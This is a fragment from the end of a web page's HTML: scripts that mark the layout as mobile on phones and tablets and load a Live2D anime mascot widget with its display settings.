src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"right","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>